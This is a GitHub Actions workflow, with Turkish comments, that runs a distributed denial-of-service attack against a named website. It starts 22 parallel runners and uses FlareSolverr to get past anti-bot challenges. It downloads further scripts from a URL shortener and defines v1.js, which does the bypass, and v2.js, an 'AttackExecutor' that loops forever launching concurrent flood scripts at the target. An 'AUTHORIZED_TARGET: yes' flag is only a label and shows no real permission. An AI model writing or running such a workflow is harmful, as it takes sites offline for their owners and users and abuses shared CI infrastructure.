name: CRAW !
on:
  workflow_dispatch:

env:
  AUTHORIZED_TARGET: yes

jobs:
  vds:
    runs-on: ubuntu-latest
    strategy:
      max-parallel: 22
      matrix:
        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22]
    
    steps:
      - name: Setup environment
        run: |
          # Docker kurulumu
          sudo apt-get update
          sudo apt-get install -y docker.io
          sudo systemctl start docker
          sudo systemctl enable docker
          
          # Python ve diÄŸer baÄŸÄ±mlÄ±lÄ±klar
          pip install playwright fake-useragent nodriver curl-cffi requests
          playwright install
          npm install axios
          
      - name: Download FlareSolverr
        run: |
          # FlareSolverr Docker konteynerini Ã§alÄ±ÅŸtÄ±r
          sudo docker pull flaresolverr/flaresolverr:latest
          sudo docker run -d \
            --name flaresolverr \
            -p 8191:8191 \
            -e LOG_LEVEL=info \
            --restart unless-stopped \
            flaresolverr/flaresolverr:latest
          
          # FlareSolverr'Ä±n baÅŸlamasÄ±nÄ± bekle
          sleep 15
          
          # FlareSolverr kontrolÃ¼
          echo "FlareSolverr kontrol ediliyor..."
          curl -X GET "http://localhost:8191/v1" || echo "FlareSolverr baÅŸlatÄ±ldÄ±"
          
      - name: Download scripts
        run: |
          # Temel scriptleri indir
          wget https://curl.by/VudqN/v1.js
          wget https://curl.by/_8mO2/v2.js
          
          # v1.js - FlareSolverr ile bypass
          cat << 'EOF' > v1.js
const axios = require('axios');

class FlareSolverrBypass {
    constructor() {
        this.flaresolverrUrl = 'http://localhost:8191/v1';
        this.targetUrl = 'https://ddosguard.com.tr/';
    }

    async solveChallenge() {
        try {
            console.log('ğŸš€ FlareSolverr ile bypass baÅŸlatÄ±lÄ±yor...');
            
            const payload = {
                cmd: 'request.get',
                url: this.targetUrl,
                maxTimeout: 60000,
                session: 'ddos_session'
            };

            const response = await axios.post(this.flaresolverrUrl, payload, {
                timeout: 90000
            });

            const result = response.data;

            if (result.status === 'ok') {
                console.log('âœ… Bypass baÅŸarÄ±lÄ±!');
                console.log(`ğŸ“Š Status: ${result.solution.status}`);
                console.log(`ğŸ”— URL: ${result.solution.url}`);
                console.log(`ğŸª Cookies: ${result.solution.cookies.length} adet`);
                
                // BaÅŸarÄ±lÄ± bypass sonrasÄ± v2.js'yi tetikle
                this.triggerV2();
                return true;
            } else {
                console.log('âŒ Bypass baÅŸarÄ±sÄ±z:', result.message);
                return false;
            }
        } catch (error) {
            console.log('ğŸ’¥ FlareSolverr hatasÄ±:', error.message);
            return false;
        }
    }

    triggerV2() {
        console.log('ğŸ¯ v2.js tetikleniyor...');
        const { spawn } = require('child_process');
        
        // v2.js'yi baÅŸlat
        const v2Process = spawn('node', ['v2.js'], {
            detached: true,
            stdio: 'inherit'
        });

        // v2 process'i arka planda Ã§alÄ±ÅŸsÄ±n
        v2Process.unref();
        console.log('âœ… v2.js baÅŸlatÄ±ldÄ±');
    }

    async continuousBypass() {
        console.log('ğŸ”„ SÃ¼rekli bypass modu baÅŸlatÄ±lÄ±yor...');
        let successCount = 0;
        let attemptCount = 0;

        while (true) {
            attemptCount++;
            console.log(`\n--- Attempt ${attemptCount} ---`);
            
            const success = await this.solveChallenge();
            if (success) {
                successCount++;
            }

            console.log(`ğŸ“ˆ Ä°statistik: ${successCount}/${attemptCount} baÅŸarÄ±lÄ±`);
            
            // 30 saniye bekle ve tekrar dene
            await new Promise(resolve => setTimeout(resolve, 30000));
        }
    }
}

// Ana iÅŸlem
const bypass = new FlareSolverrBypass();

// Ã–nce bir kere bypass dene, baÅŸarÄ±lÄ± olursa v2 tetiklensin
bypass.solveChallenge().then(success => {
    if (success) {
        console.log('ğŸ‰ Ä°lk bypass baÅŸarÄ±lÄ±, v2 aktif!');
    } else {
        console.log('âš ï¸ Ä°lk bypass baÅŸarÄ±sÄ±z, 30 saniye sonra tekrar denenecek...');
        // BaÅŸarÄ±sÄ±z olursa 30 saniye sonra tekrar dene
        setTimeout(() => {
            bypass.continuousBypass();
        }, 30000);
    }
});
EOF

          # v2.js - SaldÄ±rÄ± scripti
          cat << 'EOF' > v2.js
const { spawn } = require('child_process');
const { exec } = require('child_process');

class AttackExecutor {
    constructor() {
        this.targetUrl = 'https://ddosguard.com.tr/';
        this.concurrentAttacks = 4;
        this.attackCount = 0;
    }

    runPythonAttack() {
        return new Promise((resolve) => {
            console.log('ğŸ Python saldÄ±rÄ±sÄ± baÅŸlatÄ±lÄ±yor...');
            const pythonProcess = spawn('python3', ['Test.py', this.targetUrl], {
                timeout: 200000
            });

            pythonProcess.on('close', (code) => {
                console.log(`ğŸ Python saldÄ±rÄ±sÄ± tamamlandÄ±: ${code}`);
                resolve();
            });

            pythonProcess.on('error', (err) => {
                console.log('ğŸ Python saldÄ±rÄ± hatasÄ±:', err);
                resolve();
            });
        });
    }

    runNodeAttack() {
        return new Promise((resolve) => {
            console.log('ğŸŸ¢ Node.js saldÄ±rÄ±sÄ± baÅŸlatÄ±lÄ±yor...');
            const nodeProcess = spawn('node', ['testraw.js', this.targetUrl, '666'], {
                timeout: 200000
            });

            nodeProcess.on('close', (code) => {
                console.log(`ğŸŸ¢ Node.js saldÄ±rÄ±sÄ± tamamlandÄ±: ${code}`);
                resolve();
            });

            nodeProcess.on('error', (err) => {
                console.log('ğŸŸ¢ Node.js saldÄ±rÄ± hatasÄ±:', err);
                resolve();
            });
        });
    }

    async startConcurrentAttacks() {
        console.log('ğŸ”¥ EÅŸzamanlÄ± saldÄ±rÄ±lar baÅŸlatÄ±lÄ±yor...');
        
        while (true) {
            this.attackCount++;
            console.log(`\n--- SaldÄ±rÄ± Turu ${this.attackCount} ---`);
            
            const promises = [];
            
            // EÅŸzamanlÄ± saldÄ±rÄ±lar
            for (let i = 0; i < this.concurrentAttacks; i++) {
                promises.push(this.runPythonAttack());
                promises.push(this.runNodeAttack());
                
                // KÃ¼Ã§Ã¼k gecikme
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
            
            // TÃ¼m saldÄ±rÄ±larÄ±n bitmesini bekle
            await Promise.all(promises);
            
            console.log(`âœ… Tur ${this.attackCount} tamamlandÄ±`);
            console.log('â³ 10 saniye bekleme...');
            await new Promise(resolve => setTimeout(resolve, 10000));
        }
    }
}

// v2.js baÅŸlat
const attacker = new AttackExecutor();
attacker.startConcurrentAttacks().catch(console.error);
EOF

          chmod +x v1.js v2.js testraw.js Test.py
          
      - name: Install Node.js dependencies
        run: |
          npm init -y
          npm install axios child_process
          
      - name: Run v1.js with FlareSolverr
        env:
          AUTHORIZED_TARGET: yes
        run: |
          echo "ğŸ¯ v1.js baÅŸlatÄ±lÄ±yor (FlareSolverr bypass)..."
          
          # v1.js'yi arka planda baÅŸlat
          node v1.js &
          V1_PID=$!
          
          echo "v1.js PID: $V1_PID"
          
          # v1.js'nin Ã§alÄ±ÅŸmasÄ±nÄ± bekle (v2'yi tetiklemesi iÃ§in)
          sleep 30
          
          # Process kontrolÃ¼
          if ps -p $V1_PID > /dev/null; then
            echo "âœ… v1.js hala Ã§alÄ±ÅŸÄ±yor"
          else
            echo "âš ï¸ v1.js sonlandÄ±, yeniden baÅŸlatÄ±lÄ±yor..."
            node v1.js &
            V1_PID=$!
          fi
          
          # Ana iÅŸlemin PID'ini kaydet
          echo $V1_PID > v1_pid.txt
          
      - name: Monitor and run attacks
        env:
          AUTHORIZED_TARGET: yes
        run: |
          echo "ğŸ” Processler monitor ediliyor..."
          
          # 200 saniye boyunca Ã§alÄ±ÅŸ
          for i in {1..40}; do
            echo "â±ï¸ Cycle $i/40 - 5 saniye bekle..."
            
            # Process kontrolÃ¼
            if [ -f v1_pid.txt ] && ps -p $(cat v1_pid.txt) > /dev/null; then
              echo "âœ… v1.js Ã§alÄ±ÅŸÄ±yor"
            else
              echo "ğŸ”„ v1.js yeniden baÅŸlatÄ±lÄ±yor..."
              node v1.js &
              echo $! > v1_pid.txt
            fi
            
            # 5 saniye bekle
            sleep 5
          done
          
          echo "ğŸ•’ Zaman doldu, temizlik yapÄ±lÄ±yor..."
          
      - name: Additional wait
        run: sleep 30
        
      - name: Cleanup
        if: always()
        run: |
          echo "Job completed at $(date)"
          
          # Process'leri temizle
          pkill -f "v1.js" || true
          pkill -f "v2.js" || true
          pkill -f "Test.py" || true
          pkill -f "testraw.js" || true
          
          # PID dosyasÄ±nÄ± temizle
          rm -f v1_pid.txt
          
          # Docker konteynerÄ±nÄ± durdur
          sudo docker stop flaresolverr 2>/dev/null || true
          sudo docker rm flaresolverr 2>/dev/null || true
          
          echo "ğŸ§¹ Temizlik tamamlandÄ±"
